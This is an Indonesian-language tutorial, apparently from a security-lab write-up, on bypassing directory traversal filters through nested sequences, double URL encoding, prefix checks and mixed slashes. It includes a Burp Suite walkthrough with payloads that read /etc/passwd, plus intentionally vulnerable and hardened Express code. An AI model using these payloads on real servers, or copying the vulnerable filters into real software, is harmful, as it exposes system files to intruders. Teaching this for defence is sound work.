@@ -1,0 +1,251 @@
+# Directory Traversal: Bypassing Filter Pertahanan (Nested, Encoding, & Prefix)
+
+Ketika pengembang menyadari bahaya celah _Directory Traversal_, reaksi pertama yang paling sering dilakukan adalah **membuat filter pembersihan (_sanitization/blacklist filter_)** untuk menghapus atau memblokir string berbahaya seperti `../`.
+
+Namun, jika filter tersebut dibuat secara naif (misalnya hanya menghapus string sekali jalan tanpa rekursif, tidak menangani _multi-layer URL decoding_, atau hanya memeriksa awalan folder), penyerang tetap dapat mengelabui filter dan membaca berkas rahasia sistem operasi.
+
+---
+
+## 1. Mengapa Filter Blacklist Kerap Mengalami Kegagalan?
+
+Filter berbasis _blacklist_ berusaha menebak dan memblokir pola serangan yang diketahui. Pendekatan ini memiliki kelemahan mendasar:
+1. **Pembersihan Non-Rekursif (*Single-Pass Stripping*):** Server hanya menghapus pola `../` satu kali dari teks input.
+2. **Perbedaan Lapisan Decoding (*Multi-layer Decoding Discrepancy*):** WAF / Reverse Proxy memeriksa request dalam bentuk ter-encode, sementara backend melakukan decode ulang sebelum memproses berkas.
+3. **Validasi Awalan Jalur yang Naif (*Start-of-path Flaws*):** Server hanya mengecek apakah input diawali direktori tertentu tanpa memeriksa sekuens mundur setelahnya.
+
+---
+
+## 2. Alur Eksploitasi: Tiga Teknik Utama Bypassing Filter
+
+![Directory Traversal Filter Bypass](/images/directory-traversal-filtering-bypass.svg)
+
+---
+
+## 3. Empat Teknik Bypassing Filter Populer
+
+Berikut adalah teknik-teknik yang sering digunakan untuk menembus filter proteksi Directory Traversal:
+
+---
+
+### Teknik 1: Non-Recursive Stripping (Nested Sequences `....//`)
+
+Banyak pengembang menulis fungsi pembersihan sederhana seperti ini:
+
+```javascript
+// ❌ KODE RENTAN: Hanya menghapus "../" satu kali (Single-pass)
+function sanitize(input) {
+  return input.replace(/\.\.\//g, "");
+}
+```
+
+#### Cara Kerja Penyerang:
+Penyerang menyisipkan sekuens `../` di dalam sekuens `../` lainnya (*nested/interleaved pattern*):
+```text
+....//....//....//etc/passwd
+```
+
+1. Perhatikan anatomi string: `..` + `../` + `/`
+2. Ketika server menghapus pola `../` di bagian tengah:
+   ```text
+   ..[ ../ ]/  ==> menyisakan ".." dan "/" ==> menyatu menjadi "../"
+   ```
+3. Setelah proses penghapusan selesai, sisa karakter menyatu kembali membentuk sekuens traversal utuh:
+   ```text
+   "../../../etc/passwd"
+   ```
+4. Server akhirnya membaca berkas `/etc/passwd`!
+
+#### Variasi Pola Nested Lainnya:
+- `..././..././..././etc/passwd`
+- `....\/....\/....\/etc/passwd` (campuran forward slash dan backslash)
+
+---
+
+### Teknik 2: Double URL Encoding (`%252e%252e%252f`)
+
+Dalam arsitektur modern, request pengguna melewati beberapa lapisan: **WAF / Reverse Proxy** (seperti Cloudflare, Nginx, AWS WAF) lalu ke **Backend Application Server** (Express, Spring, Tomcat, PHP).
+
+#### Cara Kerja:
+Jika WAF melakukan URL decoding satu kali sebelum memeriksa payload, penyerang dapat melakukan **Double Encoding** (meng-encode tanda `%` menjadi `%25`):
+
+| Karakter | Single URL Encode | Double URL Encode |
+| :--- | :--- | :--- |
+| `.` (Titik) | `%2e` | `%252e` |
+| `/` (Slash) | `%2f` | `%252f` |
+| `\` (Backslash) | `%5c` | `%255c` |
+| **`../`** | **`%2e%2e%2f`** | **`%252e%252e%252f`** |
+
+#### Alur Eksekusi:
+1. Penyerang mengirim: `GET /image?filename=%252e%252e%252fetc/passwd`
+2. **WAF / Reverse Proxy** melakukan decode ke-1:
+   - `%252e` berubah menjadi `%2e`
+   - `%252f` berubah menjadi `%2f`
+   - WAF memeriksa string: `%2e%2e%2f` (WAF tidak mendeteksi karakter titik `.` atau slash `/` asli, sehingga request dianggap bersih dan lolos).
+3. **Backend Server / Framework** melakukan decode ke-2 sebelum membuka berkas:
+   - `%2e%2e%2f` berubah menjadi `../`
+   - Backend membuka berkas: `/var/www/images/../etc/passwd`!
+
+#### Overlong UTF-8 Unicode Encoding:
+Beberapa web server lawas atau parser UTF-8 rentan terhadap representasi byte berlebih (*overlong characters*):
+- `%c0%af` (Overlong 2-byte representation dari `/`)
+- `%e0%80%af` (Overlong 3-byte representation dari `/`)
+- `%c1%9c` (Overlong representation dari `\`)
+
+---
+
+### Teknik 3: Validation of Start of Path (Prefix Enforced)
+
+Beberapa aplikasi memvalidasi bahwa input harus diawali dengan direktori yang ditentukan:
+
+```javascript
+// ❌ KODE RENTAN: Hanya mengecek awalan path (Prefix Check)
+if (!filename.startsWith("/var/www/images/")) {
+  return res.status(400).send("Path harus diawali /var/www/images/");
+}
+```
+
+#### Cara Kerja Penyerang:
+Penyerang cukup memenuhi syarat awalan yang diminta oleh server, kemudian langsung menambahkan sekuens `../` untuk melompat mundur keluar dari direktori tersebut:
+
+```http
+GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
+```
+
+1. Server memeriksa `startsWith("/var/www/images/")` → **VALID (Lolos!)**.
+2. Fungsi sistem filesystem membaca `/var/www/images/../../../etc/passwd` yang langsung dinormalisasi oleh kernel menjadi `/etc/passwd`.
+
+---
+
+### Teknik 4: Mixed Slashes & Windows OS Normalization (`..\`, `..\/`)
+
+Pada sistem operasi Windows atau server seperti IIS dan Apache Tomcat di Windows, baik forward-slash (`/`) maupun backslash (`\`) diperlakukan sebagai pemisah direktori yang sah.
+
+Jika filter server hanya memblokir `../`:
+- Penyerang menggunakan backslash: `..\..\..\windows\win.ini`
+- Atau campuran keduanya: `..\/..\/..\etc/passwd`
+- URL-encoded backslash: `%2e%2e%5c%2e%2e%5c`
+
+---
+
+## 4. Praktik Langkah Demi Langkah Menggunakan Burp Suite
+
+Berikut panduan pengujian saat menghadapi filter Directory Traversal di **Burp Suite**:
+
+---
+
+### Langkah 1: Tangkap Request & Uji Traversal Standar
+1. Buka browser bawaan **Burp Suite** dan akses halaman lab target.
+2. Cari request pemanggilan gambar di tab **Proxy** > **HTTP history** (`GET /image?filename=30.jpg`).
+3. Kirim request ke **Burp Repeater** (`Ctrl + R` / `Cmd + R`).
+4. Uji payload standar:
+   ```http
+   GET /image?filename=../../../etc/passwd HTTP/1.1
+   ```
+5. Jika server mengembalikan `400 Bad Request` atau `404 Not Found (File not found /images/etc/passwd)` (menandakan `../` dihapus), kita tahu filter sedang aktif!
+
+---
+
+### Langkah 2: Uji Teknik Nested Stripping (`....//`)
+1. Di Repeater, ubah parameter menjadi:
+   ```http
+   GET /image?filename=....//....//....//etc/passwd HTTP/1.1
+   ```
+2. Klik tombol **Send**.
+3. Jika server merespons `200 OK` dengan isi `/etc/passwd`, celah *Non-Recursive Stripping* terkonfirmasi!
+
+---
+
+### Langkah 3: Uji Teknik Double URL Encoding
+1. Jika nested stripping gagal, coba gunakan Double URL Encode:
+   ```http
+   GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd HTTP/1.1
+   ```
+2. Klik tombol **Send**.
+3. Jika server merespons `200 OK`, proteksi WAF berhasil dilewati!
+
+---
+
+### Langkah 4: Uji Teknik Start of Path (Prefix)
+1. Jika server mengembalikan pesan error seperti *"Path must start with /var/www/images/"*:
+   ```http
+   GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
+   ```
+2. Klik tombol **Send**.
+3. Berkas `/etc/passwd` berhasil diekstrak dan lab selesai (*Solved*)! 🎉
+
+---
+
+## 5. Bedah Kode Backend: Rentan vs Aman
+
+### ❌ Contoh Kode Backend yang Rentan (Filter Blacklist & Validasi Parsial)
+```typescript
+import path from "path";
+import fs from "fs";
+
+app.get("/image", (req, res) => {
+  let filename = req.query.filename as string;
+
+  // ❌ KESALAHAN 1: replace non-rekursif (rentan terhadap ....//)
+  filename = filename.replace(/\.\.\//g, "");
+
+  // ❌ KESALAHAN 2: startsWith naif (rentan terhadap prefix + ../../)
+  if (!filename.startsWith("/var/www/images/")) {
+    filename = "/var/www/images/" + filename;
+  }
+
+  // ❌ path.resolve mengeksekusi traversal yang tersisa
+  const finalPath = path.resolve(filename);
+  res.sendFile(finalPath);
+});
+```
+
+---
+
+### ✅ Contoh Kode Backend yang Aman (Whitelist Regex & Canonical Containment)
+```typescript
+import path from "path";
+import fs from "fs";
+
+app.get("/image", (req, res) => {
+  const BASE_DIR = path.resolve("/var/www/public/images");
+  const filename = req.query.filename as string;
+
+  if (!filename || typeof filename !== "string") {
+    return res.status(400).json({ error: "Parameter tidak valid." });
+  }
+
+  // 1. Whitelist Ketat: Tolak titik (.), slash (/), backslash (\), dan null bytes
+  // Hanya izinkan karakter alfanumerik murni beserta ekstensi yang valid
+  const isSafe = /^[a-zA-Z0-9_-]+\.(jpg|jpeg|png|gif|webp)$/.test(filename);
+  if (!isSafe) {
+    return res.status(400).json({ error: "Nama berkas ilegal terdeteksi." });
+  }
+
+  // 2. Canonical Path Resolution: Pastikan target tetap di dalam BASE_DIR
+  const targetPath = path.resolve(BASE_DIR, filename);
+
+  if (!targetPath.startsWith(BASE_DIR + path.sep)) {
+    return res.status(403).json({ error: "Akses di luar direktori kerja ditolak." });
+  }
+
+  // 3. Pastikan file fisik ada sebelum dikirim
+  if (!fs.existsSync(targetPath)) {
+    return res.status(404).json({ error: "Berkas tidak ditemukan." });
+  }
+
+  return res.sendFile(targetPath);
+});
+```
+
+---
+
+## 6. Ringkasan & Panduan Mitigasi
+
+1. **Tinggalkan Filter Blacklist (`replace` / `filter`):**
+   Jangan pernah mengandalkan fungsi penghapusan string sederhana untuk keamanan filesystem.
+2. **Gunakan Validasi Whitelist Karakter:**
+   Hanya izinkan karakter `^[a-zA-Z0-9_-]+\.[a-zA-Z]{3,4}$`.
+3. **Verifikasi Jalur Kanonikal (`startsWith(BASE_DIR + path.sep)`):**
+   Selalu gunakan fungsi canonical seperti `path.resolve()` atau `realpath()` untuk menguji apakah lokasi berkas akhir benar-benar berada di dalam folder yang diizinkan.
+4. **Gunakan ID Tidak Langsung (Indirect References):**
+   Simpan berkas menggunakan nama acak (misal UUID v4) dan akses berkas melalui ID database alih-alih nama berkas mentah dari pengguna.
